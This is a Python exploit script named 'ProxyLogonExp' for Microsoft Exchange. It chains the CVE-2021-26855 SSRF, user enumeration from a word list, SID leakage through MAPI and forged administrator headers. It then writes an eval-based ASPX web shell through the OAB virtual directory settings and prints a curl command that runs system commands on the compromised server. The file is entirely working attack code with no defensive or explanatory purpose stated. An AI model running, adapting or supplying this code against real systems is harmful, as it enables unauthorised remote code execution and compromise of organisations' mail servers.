# coding: utf-8
import sys
import re
import string
import random
import time

from requests.packages import urllib3
import requests

urllib3.disable_warnings()
req = requests.session()

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"

def genRandom(size=10, chars=string.ascii_uppercase + string.digits):
    return "".join(random.choice(chars) for _ in range(size))

def getShell(target, user_mail, FQDN, sid):
    webshell_name = "api.aspx"
    webshell_path = f"inetpub\\wwwroot\\aspnet_client\\{webshell_name}"
    # webshell_path = f"Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\{webshell_name}"
    webshell_absolute_path = f"\\\\127.0.0.1\\c$\\{webshell_path}"
    webshell_content = "%3Cscript%20language%3D%22JScript%22%20runat%3D%22server%22%3E%20function%20Page_Load%28%29%7B%2F%2A%2A%2Feval%28Request%5B%22api%22%5D%2C%22unsafe%22%29%3B%7D%3C%2Fscript%3E"
    api_name = f"{genRandom(3)}.js"
    if sid.rsplit("-",1)[1] != '500':
        sid = sid.rsplit("-",1)[0] + '-500'
    print(f"[+] Fixed SID: {sid}")

    sid_headers = {
        "User-Agent": user_agent,
        "Cookie": f"X-BEResource=administrator@{FQDN}:444/ecp/proxyLogon.ecp?a=~1942062522;",
        "Content-Type": "text/xml",
        "msExchLogonAccount": f"{sid}",
        "msExchLogonMailbox": f"{sid}",
        "msExchTargetMailbox": f"{sid}",
    }
    sid_data = f"""<r at="Negotiate" ln="john"><s>{sid}</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>"""

    rese = req.post(url=f"{target}/ecp/{api_name}", headers=sid_headers, data=sid_data, verify=False, proxies=proxies)
    if rese.status_code != 241 or not "msExchEcpCanary" in rese.headers["Set-Cookie"]:
        print("[-] SID Error")
        exit(0)

    sessid = rese.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]
    msExchEcpCanary = rese.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]
    print(f"[+] Cookie: ASP.NET_SessionId={sessid}; msExchEcpCanary={msExchEcpCanary}")
    canary_headers = {
        "User-Agent": user_agent,
        "Cookie": f"X-BEResource=administrator@{FQDN}:444/ecp/about.aspx?a=~1942062522; ASP.NET_SessionId={sessid}; msExchEcpCanary={msExchEcpCanary}",
        "msExchLogonAccount": f"{sid}",
        "msExchLogonMailbox": f"{sid}",
        "msExchTargetMailbox": f"{sid}",
    }
    resf = req.get(url=f"{target}/ecp/{api_name}", headers=canary_headers, verify=False, proxies=proxies)
    if resf.status_code != 200:
        print("[-] Wrong Canary, Sometime just skip this...")

    oab_headers = {
        "User-Agent": user_agent,
        "Cookie": f"X-BEResource=administrator@{FQDN}:444/ecp/DDI/DDIService.svc/GetList?schema=VirtualDirectory&msExchEcpCanary={msExchEcpCanary}&a=~1942062522; ASP.NET_SessionId={sessid}; msExchEcpCanary={msExchEcpCanary}",
        # :444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory
        "Content-Type": "application/json; charset=utf-8",
        "msExchLogonAccount": f"{sid}",
        "msExchLogonMailbox": f"{sid}",
        "msExchTargetMailbox": f"{sid}",
    }
    oab_data = {"filter":
        {"Parameters":
            {
                "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                "SelectedView": "",
                "SelectedVDirType": "OAB"
            }
        }
    }
    resg = req.post(url=f"{target}/ecp/{api_name}", headers=oab_headers, json=oab_data, verify=False, proxies=proxies)
    if resg.status_code != 200 or "RawIdentity" not in resg.text:
        print("[-] GetOAB Error")
        exit(0)
    oabId = resg.text.split('"RawIdentity":"')[1].split('"')[0]
    print(f"[+] OAB id: {oabId}")

    shell_headers = {
        "User-Agent": user_agent,
        "Cookie": f"X-BEResource=administrator@{FQDN}:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary={msExchEcpCanary}&a=~1942062522; ASP.NET_SessionId={sessid}; msExchEcpCanary={msExchEcpCanary}",
        "msExchLogonAccount": f"{sid}",
        "msExchLogonMailbox": f"{sid}",
        "msExchTargetMailbox": f"{sid}",
    }
    shell_data = {
        "identity": {
            "__type": "Identity:ECP",
            "DisplayName": "OAB (Default Web Site)",
            "RawIdentity": oabId
        },
        "properties": {
            "Parameters": {
                "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                "ExternalUrl": f"http://ffff/#{webshell_content}"
            }
        }
    }
    resh = requests.post(url=f"{target}/ecp/{api_name}", headers=shell_headers, json=shell_data, verify=False, proxies=proxies)
    if resh.status_code != 200:
        print("[-] Set OAB exturl Error")
        exit(0)

    reset_headers = {
        "User-Agent": user_agent,
        "Cookie": f"X-BEResource=administrator@{FQDN}:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary={msExchEcpCanary}&a=~1942062522; ASP.NET_SessionId={sessid}; msExchEcpCanary={msExchEcpCanary}",
        "Content-Type": "application/json; charset=utf-8",
                "msExchLogonAccount": f"{sid}",
        "msExchLogonMailbox": f"{sid}",
        "msExchTargetMailbox": f"{sid}",
    }
    reset_data = {
        "identity": {
            "__type": "Identity:ECP",
            "DisplayName": "OAB (Default Web Site)",
            "RawIdentity": oabId
        },
        "properties": {
            "Parameters": {
                "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                "FilePathName": webshell_absolute_path
            }
        }
    }
    resi = req.post(url=f"{target}/ecp/{api_name}", headers=reset_headers, json=reset_data, verify=False, proxies=proxies)
    if resi.status_code != 200:
        print("[-] Write WebShell Error")
        exit(0)
    
    time.sleep(3)
    webshell_url = f"{target}/aspnet_client/{webshell_name}"
    # webshell_url = f"{target}/owa/auth/{webshell_name}"
    resj = req.get(url=webshell_url, verify=False, proxies=proxies)
    if "OAB (Default Web Site)" in resj.text:
        print(f"""[+] Webshell Usage: curl -ik {webshell_url} -d 'api=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())'""")
    else:
        print("[!] No WebShell")

def getInfo(target):
    try:
        print(f"[*] Target: {target}")
        owa_url = f"{target}/owa/auth.owa"
        poc_url = f"{target}/ecp/vue.js"

        resa = req.post(url=owa_url, verify=False, proxies=proxies)
        try:
            if not resa.status_code == 400:
                print("[-] Can't get FQDN")
                exit(0)
            else:
                FQDN = resa.headers["X-FEServer"]
        except KeyError:
            print("[-] Maybe not Exchange Server?")
            exit(0)
        print(f"[*] Got FQDN: {FQDN}")

        ssrf_headers = {
            "User-Agent": user_agent,
            "Cookie": f"X-BEResource={FQDN}/EWS/Exchange.asmx?a=~1942062522;",
            "Connection": "close",
            "Content-Type": "text/xml",
        }
        ssrf_data = """<?xml version="1.0" encoding="utf-8"?>
                    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
                    xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
                    xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
                    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                        <soap:Body>
                            <m:GetFolder>
                                <m:FolderShape>
                                    <t:BaseShape>Default</t:BaseShape>
                                </m:FolderShape>
                                <m:FolderIds>
                                    <t:DistinguishedFolderId Id="inbox">
                                        <t:Mailbox>
                                            <t:EmailAddress>admin@domain.tld</t:EmailAddress>
                                        </t:Mailbox>
                                    </t:DistinguishedFolderId>
                                </m:FolderIds>
                            </m:GetFolder>
                        </soap:Body>
                    </soap:Envelope>"""
        resb = req.post(url=poc_url, headers=ssrf_headers, data=ssrf_data, verify=False, proxies=proxies)
        if resb.status_code == 200:
            print("[+] Target SSRF Vuln [CVE-2021-26855]")
            print(f"""[+] Computer Name: {resb.headers["X-DiagInfo"]}""")
            print(f"""[+] Domain Name: {resb.headers["X-CalculatedBETarget"].split(',')[1]}""")
            print(f"""[+] Guest SID: {resb.headers["Set-Cookie"].split('X-BackEndCookie=')[1].split(';')[0]}""")
            users_dict = open('users.txt').read().splitlines()
            tmp_domain = input("Input Domain [or just Enter]: ")
            for user in users_dict:
                if tmp_domain == '':
                    domain = resb.headers["X-CalculatedBETarget"].split(',')[1].split('.',1)[1]
                else:
                    domain = tmp_domain
                autodiscover_check = f"{user}@{domain}"
                autodiscover_headers = {
                    "User-Agent": user_agent,
                    "Cookie": f"X-BEResource=administrator@{FQDN}:444/autodiscover/autodiscover.xml?a=~1942062522;",
                    "Connection": "close",
                    "Content-Type": "text/xml",
                }
                autodiscover_data = f"""<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
                    <Request>
                        <EMailAddress>{autodiscover_check}</EMailAddress>
                        <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
                    </Request>
                </Autodiscover>"""
                resc = req.post(url=poc_url, headers=autodiscover_headers, data=autodiscover_data, verify=False, proxies=proxies)
                if "DisplayName" in resc.text:
                    print(f"[+] {autodiscover_check}")
                    resc_xml = f"""{resc.text}"""
                    legacyDN = re.findall('(?:<LegacyDN>)(.+?)(?:</LegacyDN>)', resc_xml)
                    mapi_headers = {
                        "User-Agent": user_agent,
                        "Cookie": f"X-BEResource=administrator@{FQDN}:444/mapi/emsmdb?MailboxId={owa_url}&a=~1942062522;",
                        "Content-Type": "application/mapi-http",
                        "X-Requesttype": "Connect",
                        "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
                        "X-Clientapplication": "Outlook/15.0.4815.1002",
                        "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:500",
                    }
                    mapi_data = f"{legacyDN[0]}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
                    resd = req.post(url=poc_url, headers=mapi_headers, data=mapi_data, verify=False, proxies=proxies)
                    try:
                        if resd.status_code != 200 or "act as owner of a UserMailbox" not in resd.text:
                            print("[-] Can't leak User SID")
                            exit(0)
                        else:
                            sid = resd.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
                            print(f"[+] Origin SID: {sid}")
                            getShell(target, autodiscover_check, FQDN, sid)
                            exit(0)
                    except IndexError:
                        print("[-] No mapi for this user")
                else:
                    print(f"[-] {autodiscover_check}")
            exit(0)
        else:
            print("[-] Maybe not SSRF Vuln [CVE-2021-26855]")
    except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout) as e:
        print(e)
        exit(0)

def main(argv):
    print("[ProxyLogonExp]\nOrigin by Udyz\nModified by hosch3n\n")
    target = f"https://{argv[1]}"
    getInfo(target)

if __name__ == "__main__":
    main(sys.argv)